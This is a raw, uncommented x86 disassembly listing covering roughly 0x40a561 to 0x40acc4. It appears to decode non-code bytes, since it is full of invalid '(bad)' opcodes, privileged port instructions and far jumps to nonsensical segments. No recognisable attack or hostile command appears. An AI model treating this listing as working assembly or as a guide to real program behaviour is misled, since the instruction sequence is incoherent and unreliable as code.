  40a561:	clc    
  40a562:	sub    ch,cl
  40a564:	pusha  
  40a565:	out    dx,al
  40a566:	mov    esi,0x8dac7d5
  40a56b:	mov    eax,0xfac2c79
  40a570:	jb     0x40a5f1
  40a572:	inc    esi
  40a573:	cmp    BYTE PTR [ebx-0x765ef532],ah
  40a579:	inc    ecx
  40a57a:	jp     0x40a594
  40a57c:	mov    al,0xef
  40a57e:	inc    eax
  40a57f:	push   edi
  40a580:	stos   DWORD PTR es:[edi],eax
  40a581:	hlt    
  40a582:	popa   
  40a583:	(bad)  [ebp+0x1a21e094]
  40a589:	or     DWORD PTR [esp+ebp*1],esp
  40a58c:	stos   BYTE PTR es:[edi],al
  40a58d:	fild   QWORD PTR [ecx]
  40a58f:	push   ecx
  40a590:	pop    ss
  40a591:	mov    dh,0xbc
  40a593:	cwde   
  40a594:	mov    bh,0xbd
  40a596:	add    DWORD PTR [edi+0xca60248],esi
  40a59c:	add    eax,0xe54a38c
  40a5a1:	push   esi
  40a5a2:	push   edx
  40a5a3:	push   eax
  40a5a4:	cld    
  40a5a5:	or     ch,BYTE PTR ds:0x25979e44
  40a5ab:	mov    edx,0xf92b8787
  40a5b0:	pop    ds
  40a5b1:	inc    ecx
  40a5b2:	pop    ss
  40a5b3:	call   0x8dc6:0x4970c8dc
  40a5ba:	jbe    0x40a566
  40a5bc:	cwde   
  40a5bd:	rcl    BYTE PTR cs:[edi-0x24187f0],1
  40a5c4:	xchg   edx,ebp
  40a5c6:	push   edi
  40a5c7:	sbb    al,0x1
  40a5c9:	(bad)  
  40a5ca:	lods   al,BYTE PTR ds:[esi]
  40a5cb:	and    ecx,DWORD PTR [eax]
  40a5cd:	ss int3 
  40a5cf:	inc    edi
  40a5d0:	popf   
  40a5d1:	ins    BYTE PTR es:[edi],dx
  40a5d2:	retf   
  40a5d3:	lods   al,BYTE PTR ds:[esi]
  40a5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5d5:	mov    dl,0x9
  40a5d7:	cmovnp eax,DWORD PTR [eax]
  40a5da:	rol    ebx,0xd6
  40a5dd:	xchg   edx,eax
  40a5de:	and    BYTE PTR [eax-0x1b2bd825],dl
  40a5e4:	fstp   TBYTE PTR [ecx-0xc]
  40a5e7:	sbb    edi,DWORD PTR [ebx+esi*2-0x5b90ef7b]
  40a5ee:	jecxz  0x40a5b1
  40a5f0:	dec    edi
  40a5f1:	test   ebp,0x9b0b100e
  40a5f7:	add    ebp,DWORD PTR [ebx-0x298e0e6]
  40a5fd:	lahf   
  40a5fe:	jmp    0x1c7c15c0
  40a603:	pop    ds
  40a604:	cwde   
  40a605:	sub    DWORD PTR [esi-0x1c920242],esi
  40a60b:	int3   
  40a60c:	cmp    DWORD PTR [eax+0x19c0d140],ebp
  40a612:	ss mov ch,0x36
  40a615:	(bad)  
  40a616:	mov    eax,0xb3d00ae9
  40a61b:	push   cs
  40a61c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61d:	sub    eax,0x25ead460
  40a622:	arpl   WORD PTR [edx-0x113b481f],cx
  40a628:	ret    0x9653
  40a62b:	and    BYTE PTR [edx+0x6af1802d],dh
  40a631:	jnp    0x40a618
  40a633:	mov    dl,0x40
  40a635:	mov    ebp,0x24692d03
  40a63a:	xchg   edi,ebp
  40a63c:	test   eax,0x935bf77d
  40a641:	inc    ebx
  40a642:	xchg   edi,eax
  40a643:	(bad)  
  40a645:	inc    ebx
  40a646:	out    0x1d,al
  40a648:	retf   0x30e9
  40a64b:	cdq    
  40a64c:	dec    esi
  40a64d:	in     al,0x7c
  40a64f:	push   ds
  40a650:	(bad)  
  40a651:	es xor bl,0x12
  40a655:	pop    ecx
  40a656:	pop    ss
  40a657:	enter  0xa622,0xbc
  40a65b:	cmp    eax,0xa83fa595
  40a660:	(bad)  
  40a662:	cwde   
  40a663:	adc    al,0xa1
  40a665:	dec    edi
  40a666:	aad    0xa3
  40a668:	dec    edi
  40a669:	xchg   ebp,eax
  40a66a:	ror    BYTE PTR [edx+0x51],cl
  40a66d:	xchg   ebx,eax
  40a66e:	jge    0x40a613
  40a670:	push   ecx
  40a671:	ret    0x7de6
  40a674:	cwde   
  40a675:	sbb    esi,edx
  40a677:	das    
  40a678:	mov    dl,0x75
  40a67a:	pop    edx
  40a67b:	xchg   esi,eax
  40a67c:	js     0x40a640
  40a67e:	out    dx,al
  40a67f:	cs data16 loop 0x40a66f
  40a683:	push   esp
  40a684:	push   ecx
  40a685:	shl    edx,cl
  40a687:	pop    edi
  40a688:	jmp    0x3cc4:0x5b4dd136
  40a68f:	stc    
  40a690:	mov    esp,DWORD PTR [edx+0x10]
  40a693:	mov    BYTE PTR [ebp+0x10],dh
  40a696:	dec    edx
  40a697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a698:	(bad)  
  40a699:	js     0x40a628
  40a69b:	inc    ebx
  40a69c:	or     BYTE PTR [edi+0x4273ea4e],ch
  40a6a2:	jae    0x40a6c6
  40a6a4:	iret   
  40a6a5:	cmc    
  40a6a6:	jg     0x40a6d1
  40a6a8:	jno    0x40a641
  40a6aa:	(bad)  
  40a6ab:	leave  
  40a6ac:	fcomp  DWORD PTR [esi+eiz*2+0x32]
  40a6b0:	ret    0x5746
  40a6b3:	adc    esi,DWORD PTR [edi]
  40a6b5:	jmp    0xce74729b
  40a6ba:	stc    
  40a6bb:	and    dl,BYTE PTR [eax-0x35]
  40a6be:	scas   eax,DWORD PTR es:[edi]
  40a6bf:	or     edx,DWORD PTR [ecx+0x31]
  40a6c2:	mov    ah,0x39
  40a6c4:	bound  edi,QWORD PTR [eax+0x4e]
  40a6c7:	push   esi
  40a6c8:	daa    
  40a6c9:	out    0xf1,al
  40a6cb:	and    eax,0x83031635
  40a6d0:	dec    eax
  40a6d1:	dec    ecx
  40a6d2:	jl     0x40a73c
  40a6d4:	cs inc edx
  40a6d6:	sbb    esi,esi
  40a6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d9:	test   BYTE PTR [esi-0x3],bl
  40a6dc:	pop    ds
  40a6dd:	or     esp,DWORD PTR [esp+eax*1+0x11198599]
  40a6e4:	xor    BYTE PTR [edi+0x6ae2e83b],0x32
  40a6eb:	fdiv   st,st(0)
  40a6ed:	sar    BYTE PTR [edi],0xfc
  40a6f0:	clc    
  40a6f1:	push   ecx
  40a6f2:	es pop edx
  40a6f4:	enter  0x9bf6,0xcb
  40a6f8:	add    al,0xae
  40a6fa:	xchg   esp,eax
  40a6fb:	test   BYTE PTR [ecx],bh
  40a6fd:	mov    al,ds:0xad8cfb66
  40a702:	test   BYTE PTR [ecx-0x12eaa27b],0x2d
  40a709:	div    BYTE PTR [ecx]
  40a70b:	or     edi,DWORD PTR [ecx]
  40a70d:	mov    edi,0xd311860f
  40a712:	pushf  
  40a713:	test   al,ch
  40a715:	imul   esp,DWORD PTR [edx-0x3a],0x926e22bb
  40a71c:	aas    
  40a71d:	fcmovnbe st,st(0)
  40a71f:	cs jbe 0x40a70e
  40a722:	mov    al,ds:0x9472f5a0
  40a727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a728:	or     eax,esp
  40a72a:	xchg   edx,eax
  40a72b:	mov    bl,0xbe
  40a72d:	dec    edx
  40a72e:	mov    edi,0xd13b8d2d
  40a733:	shr    esp,0x73
  40a736:	rcl    ebx,1
  40a738:	inc    ecx
  40a739:	enter  0xa814,0xe2
  40a73d:	push   esi
  40a73e:	ror    eax,cl
  40a740:	lods   eax,DWORD PTR ds:[esi]
  40a741:	xchg   ebx,eax
  40a742:	outs   dx,BYTE PTR ds:[esi]
  40a743:	push   cs
  40a744:	mov    edi,0xabbd5dc7
  40a749:	xchg   BYTE PTR [edx+0x5fa021d6],bh
  40a74f:	pop    es
  40a750:	in     eax,0x1f
  40a752:	cmp    DWORD PTR [ebx+0x7497aa7],eax
  40a758:	sahf   
  40a759:	sar    ebx,1
  40a75b:	int    0xc8
  40a75d:	mov    WORD PTR [ebp+0x3d],?
  40a760:	jnp    0x40a750
  40a762:	imul   ebp,DWORD PTR [esp+esi*8-0x3d74b764],0xffffffa2
  40a76a:	shl    DWORD PTR [ebx],1
  40a76c:	and    dl,0x44
  40a76f:	fwait
  40a770:	xor    BYTE PTR [edx-0x716e123f],ah
  40a776:	(bad)  
  40a777:	lahf   
  40a778:	sbb    esi,DWORD PTR [ecx]
  40a77a:	sbb    DWORD PTR [eax+0x76],edi
  40a77d:	xor    ch,BYTE PTR [eax]
  40a77f:	dec    ecx
  40a780:	jecxz  0x40a763
  40a782:	cmp    al,0x7c
  40a784:	in     al,0xd3
  40a786:	sub    DWORD PTR [ebp-0x4c],ecx
  40a789:	shl    DWORD PTR [ebx],0x83
  40a78c:	inc    BYTE PTR [ebx-0x6f]
  40a78f:	mov    edi,0x4f17425b
  40a794:	mov    ecx,0x48dfedff
  40a799:	xchg   edi,eax
  40a79a:	mov    ch,BYTE PTR [ebx-0x44]
  40a79d:	hlt    
  40a79e:	mov    esp,0xa2adaa48
  40a7a3:	js     0x40a726
  40a7a5:	into   
  40a7a6:	int3   
  40a7a7:	push   esi
  40a7a8:	ss cld 
  40a7aa:	fwait
  40a7ab:	popfw  
  40a7ad:	icebp  
  40a7ae:	shl    DWORD PTR [ebx-0x37],cl
  40a7b1:	push   eax
  40a7b2:	(bad)  
  40a7b3:	mov    ds:0x4b4b4e0d,al
  40a7b8:	adc    eax,0xc54e8929
  40a7bd:	and    DWORD PTR [edx+0xf],edi
  40a7c0:	mov    ah,0x2
  40a7c2:	push   ebp
  40a7c3:	cmp    eax,0x6e6f5bd6
  40a7c8:	mov    dh,0x64
  40a7ca:	je     0x40a7e5
  40a7cc:	fs retf 
  40a7ce:	int3   
  40a7cf:	fstp   QWORD PTR [eax+0x3d7214e0]
  40a7d5:	adc    edi,DWORD PTR [ecx-0x57]
  40a7d8:	mov    dl,0xe0
  40a7da:	or     DWORD PTR [ecx],ebp
  40a7dc:	aaa    
  40a7dd:	mov    edi,0x867d09af
  40a7e2:	mov    ah,0x3c
  40a7e4:	sub    DWORD PTR [edi+0x5a],esp
  40a7e7:	or     esp,DWORD PTR [ecx]
  40a7e9:	sub    eax,0x6a3f98a2
  40a7ee:	fnsave [edi-0xf]
  40a7f1:	ins    DWORD PTR es:[edi],dx
  40a7f2:	cmp    bl,BYTE PTR [edi+0x77e0913a]
  40a7f8:	push   ebp
  40a7f9:	jns    0x40a866
  40a7fb:	xlat   BYTE PTR ds:[ebx]
  40a7fc:	fiadd  DWORD PTR [ebp-0x34]
  40a7ff:	sub    edx,esi
  40a801:	adc    al,0x14
  40a803:	fsub   st,st(0)
  40a805:	dec    edi
  40a806:	std    
  40a807:	pop    edi
  40a808:	(bad)  
  40a809:	mov    dh,0xf1
  40a80b:	pop    ebx
  40a80c:	mov    bh,0x84
  40a80e:	mov    ds:0x61f8389d,eax
  40a813:	outs   dx,BYTE PTR ds:[esi]
  40a814:	pop    eax
  40a815:	retf   
  40a816:	mov    eax,ds:0x5326a599
  40a81b:	cwde   
  40a81c:	and    ecx,DWORD PTR [edi-0x40c4f41e]
  40a822:	adc    al,0x63
  40a824:	pop    esi
  40a825:	sub    al,0x27
  40a827:	cmp    DWORD PTR [edi],edi
  40a829:	dec    edx
  40a82a:	in     eax,0xfa
  40a82c:	loopne 0x40a829
  40a82e:	inc    esi
  40a82f:	and    bh,BYTE PTR [eax+0x5b]
  40a832:	test   BYTE PTR [esi],bl
  40a834:	lock fisub WORD PTR [edi-0x1be7f69d]
  40a83b:	sar    edi,1
  40a83d:	jmp    FWORD PTR [eax]
  40a83f:	in     eax,dx
  40a840:	mov    edx,0xe568f80a
  40a845:	aaa    
  40a846:	sahf   
  40a847:	adc    DWORD PTR [ecx+0x2d7db1e9],0x4b54c257
  40a851:	clc    
  40a852:	aas    
  40a853:	inc    ebx
  40a854:	push   0x58
  40a856:	mov    BYTE PTR [edx],dl
  40a858:	add    eax,DWORD PTR [eax+eiz*2]
  40a85b:	enter  0x7721,0x8f
  40a85f:	(bad)  [ecx+edi*8+0x5d6f3368]
  40a866:	sbb    eax,0x2f0aa73a
  40a86b:	js     0x40a8d0
  40a86d:	das    
  40a86e:	sbb    al,0x7d
  40a870:	sbb    BYTE PTR [eax-0x46],dh
  40a873:	push   eax
  40a874:	xchg   ebx,eax
  40a875:	cmp    edx,DWORD PTR [ebp+0x72]
  40a878:	mov    ecx,0x5706f6d7
  40a87d:	or     ecx,DWORD PTR [edi-0x1cf1fa1c]
  40a883:	fistp  QWORD PTR [edx+0x5721acaf]
  40a889:	xor    bl,BYTE PTR [eax+edx*8]
  40a88c:	inc    esp
  40a88d:	sub    BYTE PTR [ebx-0x6e4d7b0a],dl
  40a893:	shr    DWORD PTR [edx],0x15
  40a896:	xchg   esi,eax
  40a897:	les    edi,FWORD PTR [ebx+0x17dacaec]
  40a89d:	test   BYTE PTR [esi],0x9
  40a8a0:	pop    edx
  40a8a1:	mov    ?,WORD PTR [edx+0x4debb5de]
  40a8a7:	jl     0x40a866
  40a8a9:	sbb    DWORD PTR [ebx],0xffffffa2
  40a8ac:	(bad)  
  40a8ae:	fs lahf 
  40a8b0:	xlat   BYTE PTR ds:[ebx]
  40a8b1:	call   0x8f5b:0x139fd728
  40a8b8:	jg     0x40a85c
  40a8ba:	icebp  
  40a8bb:	mov    al,ds:0x9f808425
  40a8c0:	adc    ebx,eax
  40a8c2:	rcr    cl,cl
  40a8c4:	aas    
  40a8c5:	adc    BYTE PTR [edi+0x5],0xaa
  40a8c9:	adc    al,BYTE PTR [ecx]
  40a8cb:	aas    
  40a8cc:	ds push ss
  40a8ce:	dec    ecx
  40a8cf:	pop    esi
  40a8d0:	add    BYTE PTR [edi+ebp*8-0x5cd15e4b],ah
  40a8d7:	ss dec eax
  40a8d9:	ds fwait
  40a8db:	adc    BYTE PTR ds:0x330e7839,ch
  40a8e1:	fucomp st(1)
  40a8e3:	or     BYTE PTR ds:0xd4a4dd69,dl
  40a8e9:	sub    DWORD PTR [ebx+ebp*2-0x79c97661],ecx
  40a8f0:	fs pop esi
  40a8f2:	jle    0x40a8f2
  40a8f4:	mov    DWORD PTR [eax],eax
  40a8f6:	in     eax,dx
  40a8f7:	hlt    
  40a8f8:	jmp    eax
  40a8fa:	dec    edx
  40a8fb:	in     al,dx
  40a8fc:	jnp    0x40a882
  40a8fe:	mov    dl,0x2c
  40a900:	ins    DWORD PTR es:[edi],dx
  40a901:	mov    WORD PTR [esi],cs
  40a903:	pop    edx
  40a904:	int    0x51
  40a906:	mov    ds:0x257d0cec,eax
  40a90b:	push   0xe2abd3d2
  40a910:	nop
  40a911:	pop    ebx
  40a912:	xchg   edx,eax
  40a913:	xchg   ebp,eax
  40a914:	mov    DWORD PTR [ebp+0x589873cf],ebp
  40a91a:	in     eax,dx
  40a91b:	in     al,0xd9
  40a91d:	imul   ebp,DWORD PTR [edi],0x3501f9e8
  40a923:	std    
  40a924:	dec    ebp
  40a925:	lods   al,BYTE PTR ds:[esi]
  40a926:	mov    dl,ch
  40a928:	mov    ebp,0x6155dbab
  40a92d:	cld    
  40a92e:	cmp    esp,esp
  40a930:	xchg   edi,eax
  40a931:	xchg   esi,eax
  40a932:	pushf  
  40a933:	ss retf 
  40a935:	or     esi,DWORD PTR [edi-0x3d]
  40a938:	mov    dl,bl
  40a93a:	mov    ebp,0xcbce17dd
  40a93f:	(bad)
  40a942:	loop   0x40a97c
  40a944:	inc    edx
  40a945:	and    esi,DWORD PTR [edi-0x2f]
  40a948:	dec    ecx
  40a949:	jbe    0x40a936
  40a94b:	inc    DWORD PTR [eax+0x25]
  40a94e:	icebp  
  40a94f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40a951:	out    0xf4,eax
  40a953:	sar    ah,cl
  40a955:	cmc    
  40a956:	sbb    eax,0xc9386601
  40a95b:	jno    0x40a94e
  40a95d:	jmp    0x5e15cf8d
  40a962:	mov    DWORD PTR [edx],ebx
  40a964:	mov    al,0xd4
  40a966:	out    0x3e,al
  40a968:	fist   WORD PTR fs:[edx-0x2b]
  40a96c:	add    dh,bl
  40a96e:	or     eax,0x5345c1cf
  40a973:	div    al
  40a975:	and    edx,DWORD PTR ds:0xc6ba6b3
  40a97b:	inc    ebx
  40a97c:	pop    edi
  40a97d:	fild   DWORD PTR [ebx+0x1d]
  40a980:	sbb    dl,BYTE PTR [ebp-0x2]
  40a983:	xor    ebp,esp
  40a985:	outs   dx,BYTE PTR ds:[esi]
  40a986:	mov    ebx,0x198170c8
  40a98b:	sbb    al,BYTE PTR [ecx-0x6c]
  40a98e:	cmovne edi,DWORD PTR [ebx+0x3e166e40]
  40a995:	or     ebx,DWORD PTR [edi+0x45a09228]
  40a99b:	iret   
  40a99c:	lock xchg dl,dl
  40a99f:	or     al,0x54
  40a9a1:	pushf  
  40a9a2:	rcl    DWORD PTR [esi-0x54],0xdd
  40a9a6:	push   ebp
  40a9a7:	pop    ss
  40a9a8:	mov    al,0xb2
  40a9aa:	jnp    0x40aa21
  40a9ac:	iret   
  40a9ad:	(bad)  
  40a9ae:	push   esi
  40a9af:	and    al,dl
  40a9b1:	dec    edx
  40a9b2:	int3   
  40a9b3:	push   0xcbed9caf
  40a9b8:	(bad)  
  40a9b9:	dec    esi
  40a9ba:	sub    esi,DWORD PTR [edi+0x2d8543a3]
  40a9c0:	cmp    esp,DWORD PTR [edi]
  40a9c2:	mov    ch,0xcf
  40a9c4:	adc    BYTE PTR [edi+0x51],dh
  40a9c7:	daa    
  40a9c8:	(bad)  
  40a9c9:	and    BYTE PTR [edi],0x97
  40a9cc:	cli    
  40a9cd:	(bad)  [ebx+eax*1]
  40a9d0:	jnp    0x40aa2a
  40a9d2:	pop    esi
  40a9d3:	or     dl,ch
  40a9d5:	xor    esi,esp
  40a9d7:	xchg   esp,eax
  40a9d8:	xchg   edx,eax
  40a9d9:	repnz addr16 xchg ebx,eax
  40a9dc:	ja     0x40a9fe
  40a9de:	gs jae 0x40aa2b
  40a9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e2:	push   es
  40a9e3:	mov    edi,0xb62b948d
  40a9e8:	lea    esi,[eax-0x72]
  40a9eb:	jno    0x40aa5c
  40a9ed:	mov    dh,0xf2
  40a9ef:	mov    al,ds:0x76c41549
  40a9f4:	mov    esp,0xed373f30
  40a9f9:	dec    ecx
  40a9fa:	cmc    
  40a9fb:	add    ch,BYTE PTR [esi+0x139ec1e0]
  40aa01:	inc    ecx
  40aa02:	cmp    eax,0x421fb66d
  40aa07:	dec    ecx
  40aa08:	sbb    esi,DWORD PTR [edi]
  40aa0a:	or     eax,0xa44d65d2
  40aa0f:	jmp    0x3405:0x5af0fa6f
  40aa16:	lods   eax,DWORD PTR ds:[esi]
  40aa17:	jecxz  0x40aa4f
  40aa19:	adc    BYTE PTR [esp+eiz*8+0x3f],bl
  40aa1d:	cwde   
  40aa1e:	dec    esi
  40aa1f:	or     DWORD PTR [ebp+eiz*8+0x3d1cc1aa],ecx
  40aa26:	aas    
  40aa27:	inc    edx
  40aa28:	into   
  40aa29:	test   DWORD PTR [eax-0x54248bb0],ecx
  40aa2f:	and    ecx,DWORD PTR [edx-0x66]
  40aa32:	sbb    ecx,DWORD PTR [esi+eiz*2]
  40aa35:	loop   0x40aa80
  40aa37:	std    
  40aa38:	lock jmp 0x40aa8a
  40aa3b:	ja     0x40a9e9
  40aa3d:	cmp    eax,0x6f34293d
  40aa42:	inc    edx
  40aa43:	in     eax,dx
  40aa44:	jno    0x40aa34
  40aa46:	loope  0x40a9ef
  40aa48:	sub    ch,al
  40aa4a:	ja     0x40aabe
  40aa4c:	clc    
  40aa4d:	fisub  WORD PTR [edx-0x1b845f67]
  40aa53:	inc    ebx
  40aa54:	mov    ds:0x75ed3838,eax
  40aa59:	push   ebx
  40aa5a:	out    0x8d,al
  40aa5c:	mov    bh,0xc1
  40aa5e:	out    0x1e,al
  40aa60:	addr16 in al,dx
  40aa62:	and    DWORD PTR [eax+0x5682bc77],esi
  40aa68:	mov    bl,0xc3
  40aa6a:	cmp    dh,BYTE PTR [eax-0x79]
  40aa6d:	(bad)  
  40aa6f:	xchg   ebx,eax
  40aa70:	sbb    ecx,edi
  40aa72:	ins    DWORD PTR es:[edi],dx
  40aa73:	cmp    eax,0x1388d986
  40aa78:	inc    ecx
  40aa79:	mov    BYTE PTR [esi],bl
  40aa7b:	dec    edx
  40aa7c:	cli    
  40aa7d:	ror    BYTE PTR ds:0x118c19cb,1
  40aa83:	mov    dh,0xb9
  40aa85:	or     BYTE PTR [eax],cl
  40aa87:	add    BYTE PTR [ecx+0x1e],ah
  40aa8a:	int3   
  40aa8b:	mov    edi,0xb129c554
  40aa90:	mov    WORD PTR [ebx-0xc3062bb],?
  40aa96:	jae    0x40aa27
  40aa98:	add    ch,BYTE PTR [ecx-0x46]
  40aa9b:	pop    esp
  40aa9c:	xchg   ecx,eax
  40aa9d:	pushf  
  40aa9e:	(bad)  
  40aa9f:	fimul  DWORD PTR [edx-0x79]
  40aaa2:	(bad)  
  40aaa3:	cld    
  40aaa4:	in     eax,0xc9
  40aaa6:	xchg   ebp,eax
  40aaa7:	cli    
  40aaa8:	outs   dx,BYTE PTR ds:[esi]
  40aaa9:	rcl    DWORD PTR [esi+0xf212097],1
  40aaaf:	fwait
  40aab0:	pop    esp
  40aab1:	inc    esp
  40aab2:	psubsw mm4,mm7
  40aab5:	adc    ecx,DWORD PTR [eax-0x46]
  40aab8:	outs   dx,DWORD PTR ds:[esi]
  40aab9:	int3   
  40aaba:	sar    BYTE PTR [edx+0x7bab7d70],0xdf
  40aac1:	jnp    0x40aa80
  40aac3:	pop    ebp
  40aac4:	push   eax
  40aac5:	and    esi,esp
  40aac7:	mov    bh,BYTE PTR [ecx]
  40aac9:	pusha  
  40aaca:	mov    ebx,0x5572eb86
  40aacf:	pusha  
  40aad0:	nop
  40aad1:	pop    es
  40aad2:	adc    DWORD PTR [ebx],ebp
  40aad4:	jge    0x40aac1
  40aad6:	push   0x27
  40aad8:	xchg   ebp,eax
  40aad9:	repz adc DWORD PTR [ecx-0x32],0x19c91787
  40aae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aae2:	adc    ebx,DWORD PTR [ecx+0x223d4d1b]
  40aae8:	jb     0x40ab46
  40aaea:	cmp    BYTE PTR [ebx-0x5589dab7],0xbf
  40aaf1:	push   esp
  40aaf2:	pop    ds
  40aaf3:	jp     0x40ab23
  40aaf5:	xor    BYTE PTR [eax+eax*8+0x393ed36a],bl
  40aafc:	cmp    BYTE PTR [ebx+0x9],al
  40aaff:	mov    cl,0xb5
  40ab01:	lahf   
  40ab02:	mov    ds:0xe821c45,eax
  40ab07:	rol    BYTE PTR [ecx-0x7a],1
  40ab0a:	addr16 dec edx
  40ab0c:	ficomp WORD PTR [edi]
  40ab0e:	add    BYTE PTR [edx-0x5235ea98],cl
  40ab14:	or     esp,ebx
  40ab16:	inc    edi
  40ab17:	lea    eax,[esp+eax*4]
  40ab1a:	nop
  40ab1b:	popf   
  40ab1c:	sahf   
  40ab1d:	shl    DWORD PTR [eax+0x4acdde7a],1
  40ab23:	push   ds
  40ab24:	dec    edi
  40ab25:	jb     0x40aae3
  40ab27:	pop    eax
  40ab28:	mov    ecx,0x11c4c861
  40ab2d:	jl     0x40ab21
  40ab2f:	pop    eax
  40ab30:	push   esp
  40ab31:	arpl   WORD PTR [edx-0x2125e9c0],si
  40ab37:	mov    bl,BYTE PTR [edi-0x7ed1dae9]
  40ab3d:	ret    0x21c
  40ab40:	test   cl,0xf2
  40ab43:	push   esi
  40ab44:	xchg   ebx,eax
  40ab45:	xor    BYTE PTR [ecx],dl
  40ab47:	(bad)  
  40ab48:	pop    esp
  40ab49:	cmp    al,0x39
  40ab4b:	adc    al,0x1d
  40ab4d:	mov    cl,0x8c
  40ab4f:	add    esp,DWORD PTR [ebx+0x1c483759]
  40ab55:	jg     0x40aaf4
  40ab57:	sub    DWORD PTR [edi-0x15],ebp
  40ab5a:	int3   
  40ab5b:	xlat   BYTE PTR ds:[ebx]
  40ab5c:	xchg   ch,bh
  40ab5e:	aam    0xa6
  40ab60:	and    dh,BYTE PTR [edx-0x69]
  40ab63:	int3   
  40ab64:	test   bl,bh
  40ab66:	xor    al,0x28
  40ab68:	sbb    bl,ch
  40ab6a:	popf   
  40ab6b:	and    ebx,DWORD PTR [edi-0x4e6d5500]
  40ab71:	pop    ebx
  40ab72:	mov    edx,0x83285ba9
  40ab77:	sbb    cl,dl
  40ab79:	push   edi
  40ab7a:	es ins BYTE PTR es:[edi],dx
  40ab7c:	cwde   
  40ab7d:	scas   al,BYTE PTR es:[edi]
  40ab7e:	mov    edx,0x8501c9c3
  40ab83:	imul   edi,DWORD PTR [ecx+0x370f1cc7],0x57eae36c
  40ab8d:	gs push edi
  40ab8f:	pop    ds
  40ab90:	xchg   esp,eax
  40ab91:	xor    BYTE PTR [edx],ah
  40ab93:	lods   eax,DWORD PTR ds:[esi]
  40ab94:	add    BYTE PTR [ebp-0x4d6adee1],cl
  40ab9a:	(bad)  
  40ab9b:	aad    0xbc
  40ab9d:	add    eax,0x5d516691
  40aba2:	mov    esp,0x7f89ade3
  40aba7:	xor    edi,ebx
  40aba9:	lds    edx,FWORD PTR [ebp+0x5]
  40abac:	in     eax,0xb0
  40abae:	lods   eax,DWORD PTR ds:[esi]
  40abaf:	pop    ds
  40abb0:	mov    ebp,0x1df9e99c
  40abb5:	lahf   
  40abb6:	repnz sbb ah,ah
  40abb9:	add    ch,BYTE PTR [ecx-0x1be66361]
  40abbf:	je     0x40ab63
  40abc1:	xlat   BYTE PTR ds:[ebx]
  40abc2:	push   ecx
  40abc3:	fsub   QWORD PTR ds:0x6fa30a34
  40abc9:	test   DWORD PTR [eax],ebp
  40abcb:	enter  0x227b,0xe1
  40abcf:	test   BYTE PTR [eax+0x6f],dh
  40abd2:	dec    esp
  40abd3:	(bad)  
  40abd4:	aad    0x2e
  40abd6:	ins    BYTE PTR es:[edi],dx
  40abd7:	jns    0x40ac3e
  40abd9:	xchg   ebx,eax
  40abda:	ret    0xa482
  40abdd:	cli    
  40abde:	clc    
  40abdf:	jae    0x40ab69
  40abe1:	popa   
  40abe2:	pop    cx
  40abe4:	mov    bh,0x12
  40abe6:	mov    ah,0x55
  40abe8:	jp     0x40ab73
  40abea:	add    ebx,DWORD PTR [eax+ecx*4+0x7636684d]
  40abf1:	lds    edi,FWORD PTR [esi]
  40abf3:	dec    esp
  40abf4:	adc    DWORD PTR [esi],0xffffff9c
  40abf7:	mov    bl,0xbb
  40abf9:	and    al,0xa4
  40abfb:	push   0x67
  40abfd:	cmp    cl,BYTE PTR [ebx-0x15]
  40ac00:	or     cl,BYTE PTR [eax]
  40ac02:	fldcw  WORD PTR [ebp-0x13]
  40ac05:	cmp    cl,0x8c
  40ac08:	adc    DWORD PTR [ebx-0x1c],ebp
  40ac0b:	pop    ss
  40ac0c:	adc    DWORD PTR [ebx],ebp
  40ac0e:	and    BYTE PTR [edi-0x6679000],bh
  40ac14:	mov    ebp,0xce612aa0
  40ac19:	jno    0x40ac00
  40ac1b:	out    dx,eax
  40ac1c:	mov    ds:0xf8f61ecb,eax
  40ac21:	push   0x66
  40ac23:	xchg   edx,eax
  40ac24:	adc    BYTE PTR [ebx+0x21],0x4f
  40ac28:	xchg   ebp,eax
  40ac29:	ret    
  40ac2a:	dec    ebp
  40ac2b:	imul   edi,DWORD PTR [esi+0x2f],0x16
  40ac2f:	mul    BYTE PTR [ecx]
  40ac31:	mov    eax,ds:0xf0c8f3d0
  40ac36:	(bad)  
  40ac37:	(bad)  [edi]
  40ac39:	or     ebp,DWORD PTR [edx-0x44349acb]
  40ac3f:	fcom   QWORD PTR [ebx-0x658f8978]
  40ac46:	test   eax,0xda4c3737
  40ac4b:	fdivrp st(6),st
  40ac4d:	retf   0x35cb
  40ac50:	lods   eax,DWORD PTR ds:[esi]
  40ac51:	fwait
  40ac52:	setns  BYTE PTR ds:[eax]
  40ac56:	xor    esp,DWORD PTR [edi]
  40ac58:	sbb    eax,0xedcb95b0
  40ac5d:	mov    ch,0x42
  40ac5f:	mov    esp,0xfab8ec67
  40ac64:	jb     0x40ac87
  40ac66:	cwde   
  40ac67:	call   0x44fb:0x3b9138d0
  40ac6e:	pushf  
  40ac6f:	inc    edi
  40ac70:	mov    esi,0x640b140e
  40ac75:	adc    eax,0xd3f3bc4b
  40ac7a:	cmp    ah,al
  40ac7c:	out    0x21,eax
  40ac7e:	mov    bl,0x84
  40ac80:	sbb    BYTE PTR [edx-0x2cc400eb],ah
  40ac86:	inc    esi
  40ac87:	out    dx,al
  40ac88:	aad    0xfe
  40ac8a:	sbb    al,0xcf
  40ac8c:	(bad)  [edx-0x198d4d79]
  40ac92:	clc    
  40ac93:	(bad)  
  40ac95:	mov    eax,0x9e3cdad9
  40ac9a:	nop
  40ac9b:	out    dx,eax
  40ac9c:	loope  0x40ad11
  40ac9e:	push   ecx
  40ac9f:	icebp  
  40aca0:	scas   eax,DWORD PTR es:[edi]
  40aca1:	push   ecx
  40aca2:	cmc    
  40aca3:	aad    0xa7
  40aca5:	mov    bh,0x2
  40aca7:	mov    edi,0x45397d5c
  40acac:	xchg   edi,eax
  40acad:	or     al,0x5d
  40acaf:	in     al,0x30
  40acb1:	daa    
  40acb2:	inc    bx
  40acb4:	sar    DWORD PTR [eax],1
  40acb6:	and    DWORD PTR [edi+0x311ef566],esi
  40acbc:	sbb    edx,DWORD PTR [ebx]
  40acbe:	lahf   
  40acbf:	pmaxub mm4,QWORD PTR [ebp+0xb]
  40acc3:	cdq    
  40acc4:	(bad)  
